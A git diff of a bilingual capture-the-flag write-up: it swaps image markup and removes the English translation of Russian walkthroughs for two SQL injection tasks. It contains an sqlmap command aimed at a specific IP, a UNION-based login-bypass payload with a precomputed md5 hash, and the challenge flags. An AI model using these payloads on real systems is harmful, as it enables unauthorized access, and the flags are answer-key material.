@@ -408,59 +408,22 @@ API_v0_budet?
 API_v0_budet)
 ```
 Пытаемся понизить версию API до нулевой:
-![image](https://github.com/user-attachments/assets/29b910d9-5167-4e7a-b373-404db3cb6237)
+<img width="729" alt="image" src="https://github.com/user-attachments/assets/62dd4b4d-4998-4647-b13a-5c40be0358e6">
+
 Далее, так как у нас есть поле поиска, первое, что приходит на ум — SQL Injection.
 Пробуем проверить, вставив кавычку и простую нагрузку or 1=1:
-![image](https://github.com/user-attachments/assets/972e3d1f-50e5-4f7e-bf48-30443b2b1182)
+<img width="731" alt="image" src="https://github.com/user-attachments/assets/d2646e1a-0ffe-4d04-a757-c077b8e85094">
+
 Отлично, у нас есть уязвимость! Осталось извлечь информацию из таблиц.
 
 Теперь идём на любой ресурс, где подробно описано, как крутить подобные инъекции (напирмер, сюда: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/).
 Поэтапно определяем версию БД (здесь в качестве БД используется SQLite) и вытаскиваем её структуру:
-![image](https://github.com/user-attachments/assets/481d6ee4-312e-428f-a200-a6dd430047ff)
+<img width="856" alt="image" src="https://github.com/user-attachments/assets/aa5cb75b-d730-45e6-8bec-5cf1edaec5a5">
+
 
 Находим таблицу flag31337 с полем flag_value_tql_ctf, значение из которого нам и нужно извлечь:
-![image](https://github.com/user-attachments/assets/cba3b16d-54f3-4c70-9e3b-3962e18268d9)
+<img width="854" alt="image" src="https://github.com/user-attachments/assets/b9530c4c-0e69-4dec-bf0c-a6ced08532cd">
 
-### Разбор на английском
-This is a simple task, the essence of which comes down to analyzing JS containing API routes.
-
-First, we open the task, click the buttons, intercept requests using Burp (or any other proxy), study the source code and understand how everything works. On the path /static/api.js we find the script that is responsible for this functionality:
-```
-...
-const response = await fetch(`/api/v1.0/drinks/search?query=${query}`);
-...
-const response = await fetch('/api/v1.0/drinks');
-...
-```
-We understand that the application has 2 routes for working with the list of drinks.
-
-Having tried to latch onto the first of them with the query parameter, we find nothing. The route is invulnerable.
-Returning to the name of the task:
-```
-A_PIv0_budet?
-APIv0budet?
-API_v0_budet?
-API_v0_budet)
-```
-Trying to downgrade the API version to zero:
-![image](https://github.com/user-attachments/assets/29b910d9-5167-4e7a-b373-404db3cb6237)
-
-Next, since we have a search field, the first thing that comes to mind is SQL Injection.
-Trying to check by inserting a quote and a simple payload or 1=1:
-![image](https://github.com/user-attachments/assets/972e3d1f-50e5-4f7e-bf48-30443b2b1182)
-Great, we have a vulnerability! All that's left is to extract information from the tables.
-
-Now we go to any resource that describes in detail how to spin such injections (for example, here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/).
-Step by step, we determine the database version (here SQLite is used as a database) and extract its structure:
-![image](https://github.com/user-attachments/assets/481d6ee4-312e-428f-a200-a6dd430047ff)
-
-We find the flag31337 table with the flag_value_tql_ctf field, the value from which we need to extract:
-![image](https://github.com/user-attachments/assets/cba3b16d-54f3-4c70-9e3b-3962e18268d9)
-
-### Flag
-```
-tqlCTF{P3Y73_P1V0_P3NN03_-_8UD37_J1ZN_07M3NN4Y4}
-```
 
 ### Развертывание
 ```
@@ -504,20 +467,22 @@ Content-Length: 25
 username=123&password=123
 ```
 Мы видим 2 поля, и если в любое их них вставить кавычку, то получим ошибку 500, что говорит о наличии SQL-инъекции.
-![image](https://github.com/user-attachments/assets/5d9c4bb2-5e3b-4f7c-98f8-96b73e5d3f6d)
+<img width="686" alt="image" src="https://github.com/user-attachments/assets/406512d4-c72c-4423-b1ba-6f27992dcbf4">
+
 Аналогично прошлому заданию, можем собственноручно узнать, какая БД работает на бэкенде. В данном случае это SQLite.
 
 В этот раз воспользуемся SQLMap для извлечения данных:
 ```
 sqlmap -u http://195.200.18.108:10800/authbypass --data='username=*&password=1' -batch --dbms=sqlite --all
 ```
-![image](https://github.com/user-attachments/assets/baffe562-f091-43d4-8897-1dd00164a359)
+<img width="360" alt="image" src="https://github.com/user-attachments/assets/154403e2-6426-4605-a195-2c3aef1d86e8">
+
 
 БД состоит из одной таблицы users, в которой 3 колонки. Вероятно, в запросе возвращаются значения всех трёх колонок.
 Также мы смогли извлечь хэш пароля администратора, но взломать его быстро не получается (т.к. для его генерации использовался довольно стойкий пароль). Нужно искать другой путь.
 Попробуем сформировать запрос, который обманет логику работы механизма аутентификации. Аналогичные запросы можно найти, например, на hacktricks: https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/login-bypass/sql-login-bypass.md
 В данном случае подойдут нагрузки, которые учитывают передачу нашего "известного" хэша пароля для пользователя. Так, нам не нужно будет знать пароль в открытом виде, ведь в запросе мы передадим хэш из нашего пароля, который же сами и вычислим:
-![image](https://github.com/user-attachments/assets/b7dcb5db-af69-480b-9a55-f07ea15389bd)
+
 
 Попробуем адаптировать запросы выше к нашему случаю:
 ```
@@ -531,77 +496,14 @@ Content-Length: 116
 
 username=123' and 1=0 union select 1,'admin','428874936cb54b41723d4b6ce71ce834' from users;-- -&password=cherepawwka
 ```
-![image](https://github.com/user-attachments/assets/ddcd78b2-cb9c-476c-8dea-550b4329792f)
+<img width="856" alt="image" src="https://github.com/user-attachments/assets/5edb0b0f-2435-48f8-91ce-57935eef9766">
 
 Таким образом, мы обошли логику формы, забрав заветный флаг!
 
-### Разбор на английском
-A task to bypass the authentication mechanism, during which you need to find out the structure of the database and build a query that takes this structure into account and breaks the logic of the authentication.
-The authentication mechanism works as follows:
-1. When entering a login and password in the form, a POST request is made to the application, during which the password is converted into an md5 hash.
-2. After that, a query is made to the database to find a user with this name and hash: `SELECT * FROM users WHERE username='{username}' and hash='{printable_hash}'"`
-3. An additional forced check is introduced, during which the hash extracted from the database is compared with the hash of the password transmitted in the form.
-
-*Note: initially, the load of the type `or 1=1;-- -` should not have worked. The authentication mechanism before the competition was changed and the load began to work in order to make the task a little more transparent for the participants*.
-
-First, let's check which request goes to the backend when attempting authentication:
-```
-POST /authbypass HTTP/1.1
-Host: 195.200.18.108:10800
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 25
-
-username=123&password=123
-```
-We see 2 fields, and if we insert a quote into any of them, we will get error 500, which indicates the presence of SQL injection.
-![image](https://github.com/user-attachments/assets/5d9c4bb2-5e3b-4f7c-98f8-96b73e5d3f6d)
-Similar to the previous task, we can personally find out which database is running on the backend. In this case, it is SQLite.
-
-This time we will use SQLMap to extract data:
-```
-sqlmap -u http://195.200.18.108:10800/authbypass --data='username=*&password=1' -batch --dbms=sqlite --all
-```
-![image](https://github.com/user-attachments/assets/baffe562-f091-43d4-8897-1dd00164a359)
-
-The database consists of one table, users, which has 3 columns. The query probably returns values ​​for all three columns.
-We were also able to extract the administrator password hash, but it is not easy to crack it (since a fairly strong password was used to generate it). We need to find another way.
-Let's try to form a query that will fool the logic of the authentication mechanism. Similar queries can be found, for example, on hacktricks: https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/login-bypass/sql-login-bypass.md
-In this case, loads that take into account the transfer of our "known" password hash for the user are suitable. So, we won't need to know the password in plain text, because in the request we will pass a hash from our password, which we will calculate ourselves:
-![image](https://github.com/user-attachments/assets/b7dcb5db-af69-480b-9a55-f07ea15389bd)
-
-Let's try to adapt the requests above to our case:
-```
-md5(cherepawwka) = 428874936cb54b41723d4b6ce71ce834
-
-Request:
-POST /authbypass HTTP/1.1
-Host: 195.200.18.108:10800
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 116
-
-username=123' and 1=0 union select 1,'admin','428874936cb54b41723d4b6ce71ce834' from users;-- -&password=cherepawwka
-```
-![image](https://github.com/user-attachments/assets/ddcd78b2-cb9c-476c-8dea-550b4329792f)
-
-Thus, we bypassed the logic of the form, taking the coveted flag!
-
-### Flag
+### Флаг
 ```
 tqlCTF{C7F_l1k3_SQL1_4u7h_byp455}
 ```
-
-### Развертывание
-```
-docker build . -t yetanotherauthform
-docker run -d -p 5000:80 yetanotherauthform
-```
-
-To stop container
-```
-docker ps -a  # get ID
-docker stop ID
-```
-
 
 
 
